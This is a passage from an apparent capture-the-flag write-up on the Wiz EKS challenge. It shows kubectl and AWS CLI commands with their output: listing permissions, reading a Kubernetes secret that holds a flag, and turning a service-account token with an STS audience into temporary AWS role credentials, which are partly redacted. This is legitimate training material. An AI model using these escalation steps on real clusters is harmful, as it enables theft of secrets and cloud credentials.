<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7">$TOKEN</span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--list</span></span>
<span data-line=""><span style="color: #F69D50">warning:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">may</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">incomplete:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">webhook</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authorizer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">does</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">support</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">user</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolution</span></span>
<span data-line=""><span style="color: #F69D50">Resources</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">Non-Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">URLs</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Names</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Verbs</span></span>
<span data-line=""><span style="color: #F69D50">serviceaccounts/token</span><span style="color: #ADBAC7">                           []                  [debug-sa]         [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectaccessreviews.authorization.k8s.io</span><span style="color: #ADBAC7">   []                  []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectrulesreviews.authorization.k8s.io</span><span style="color: #ADBAC7">    []                  []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">pods</span><span style="color: #ADBAC7">                                            []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #F69D50">secrets</span><span style="color: #ADBAC7">                                         []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #F69D50">serviceaccounts</span><span style="color: #ADBAC7">                                 []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api]              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis]             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]        []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]         []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]         []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]          []                 [get]</span></span>
<span data-line=""><span style="color: #F69D50">podsecuritypolicies.policy</span><span style="color: #ADBAC7">                      []                  [eks.privileged]   [use]</span></span></code></pre></div>
<p>Perfect!  We have more access which includes fetching secrets:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7">$TOKEN</span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"items"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">        {</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"data"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"flag"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3&#x3C;*REDACTED*>="</span></span>
<span data-line=""><span style="color: #ADBAC7">            },</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Secret",</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"creationTimestamp"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T12:27:57Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"name"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"node-flag",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"namespace"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"challenge4",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"883574",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"uid"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"26461a29-ec72-40e1-adc7-99128ce664f7"</span></span>
<span data-line=""><span style="color: #ADBAC7">            },</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"type"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Opaque"</span></span>
<span data-line=""><span style="color: #ADBAC7">        }</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"List",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">""</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>So we just need to base64 decode that and we are on to the next challenge!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7">$TOKEN</span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].data.flag'</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-r</span><span style="color: #F47067">|</span><span style="color: #F69D50">base64</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span></span>
<span data-line=""><span style="color: #F69D50">wiz_eks_challenge</span><span style="color: #ADBAC7">{only_a_real_pro_can_navigate_&#x3C;*REDACTED*>}</span></span></code></pre></div>
<h1>Challenge 5</h1>
<p>The hint:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">You've successfully transitioned from a limited Service Account to a Node</span></span>
<span data-line=""><span style="color: #adbac7">Service Account! Great job. Your next challenge is to move from the EKS to the</span></span>
<span data-line=""><span style="color: #adbac7">AWS account.</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">Can you acquire the AWS role of the s3access-sa service account, and get the flag?</span></span></code></pre></div>
<p>So lets start with checking what access we do have:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">whoami</span></span>
<span data-line=""><span style="color: #F69D50">system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal</span></span></code></pre></div>
<p>Can we list buckets?</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ls</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">An</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">occurred</span><span style="color: #ADBAC7"> (AccessDenied) when calling the ListBuckets operation: Access Denied</span></span></code></pre></div>
<p>Nope!  So we need to figure out how to become the <code>s3access-sa</code>. What access do
we have?</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--list</span></span>
<span data-line=""><span style="color: #F69D50">warning:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">may</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">incomplete:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">webhook</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authorizer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">does</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">support</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">user</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolution</span></span>
<span data-line=""><span style="color: #F69D50">Resources</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">Non-Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">URLs</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Names</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Verbs</span></span>
<span data-line=""><span style="color: #F69D50">serviceaccounts/token</span><span style="color: #ADBAC7">                           []                  [debug-sa]         [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectaccessreviews.authorization.k8s.io</span><span style="color: #ADBAC7">   []                  []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectrulesreviews.authorization.k8s.io</span><span style="color: #ADBAC7">    []                  []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">pods</span><span style="color: #ADBAC7">                                            []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #F69D50">secrets</span><span style="color: #ADBAC7">                                         []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #F69D50">serviceaccounts</span><span style="color: #ADBAC7">                                 []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api]              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis]             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]        []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]         []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]         []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]          []                 [get]</span></span>
<span data-line=""><span style="color: #F69D50">podsecuritypolicies.policy</span><span style="color: #ADBAC7">                      []                  [eks.privileged]   [use]</span></span></code></pre></div>
<p>Hmm, being able to create tokens for the <code>debug-sa</code> resource definitely seems
suspicious. So lets see if that will get us anywhere:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">TOKEN=$(</span><span style="color: #F69D50">kubectl</span><span style="color: #96D0FF"> create token debug-sa)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> $TOKEN </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--list</span></span>
<span data-line=""><span style="color: #F69D50">warning:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">may</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">incomplete:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">webhook</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authorizer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">does</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">support</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">user</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolution</span></span>
<span data-line=""><span style="color: #F69D50">Resources</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">Non-Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">URLs</span><span style="color: #ADBAC7">                     </span><span style="color: #96D0FF">Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Names</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Verbs</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectaccessreviews.authorization.k8s.io</span><span style="color: #ADBAC7">   []                                    []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectrulesreviews.authorization.k8s.io</span><span style="color: #ADBAC7">    []                                    []                 [create]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/.well-known/openid-configuration]   []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api]                                []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis]                               []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openid/v1/jwks]                     []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]                           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]                           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]                            []                 [get]</span></span>
<span data-line=""><span style="color: #F69D50">podsecuritypolicies.policy</span><span style="color: #ADBAC7">                      []                                    [eks.privileged]   [use]</span></span></code></pre></div>
<p>Looks like we have less access than before.  So not too helpful, lets take a
look at that service account we want to become:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sa</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3access-sa</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ServiceAccount",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"annotations"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"eks.amazonaws.com/role-arn"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:iam::688655246681:role/challengeEksS3Role"</span></span>
<span data-line=""><span style="color: #ADBAC7">        },</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"creationTimestamp"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-10-31T20:07:34Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"name"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"s3access-sa",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"namespace"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"challenge5",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"671916",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"uid"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"86e44c49-b05a-4ebe-800b-45183a6ebbda"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>I think we are going to need to use our AWS access to assume that role, I don't
believe our kubernetes access is going to get us anywhere:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">assume-role</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-arn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-session-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">test</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">An</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">occurred</span><span style="color: #ADBAC7"> (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role</span></span></code></pre></div>
<p>Ok, so <em>maybe</em> our kubernetes access is important since we can't assume the role
directly.   Lets try to use that $TOKEN from <code>debug-sa</code> to assume the role:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">assume-role-with-web-identity</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-arn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-session-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">test</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--web-identity-token</span><span style="color: #ADBAC7"> $TOKEN</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">An</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">occurred</span><span style="color: #ADBAC7"> (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience</span></span></code></pre></div>
<p>Getting closer!   The default audience for a token created with <code>kubectl</code> is
<code>https://kubernetes.default.svc</code> which amazon doesn't seem to like.  Lets try
creating it again with <code>sts.amazonaws.com</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">TOKEN=$(</span><span style="color: #F69D50">kubectl</span><span style="color: #96D0FF"> create token debug-sa </span><span style="color: #6CB6FF">--audience</span><span style="color: #96D0FF"> sts.amazonaws.com)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">assume-role-with-web-identity</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-arn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-session-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">test</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--web-identity-token</span><span style="color: #ADBAC7"> $TOKEN</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Credentials"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"AccessKeyId"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ASIA2AVYNEV&#x3C;*REDACTED*>",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"SecretAccessKey"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"VTZ4TuDrtHGca&#x3C;*REDACTED*>",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"SessionToken"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>",</span></span>
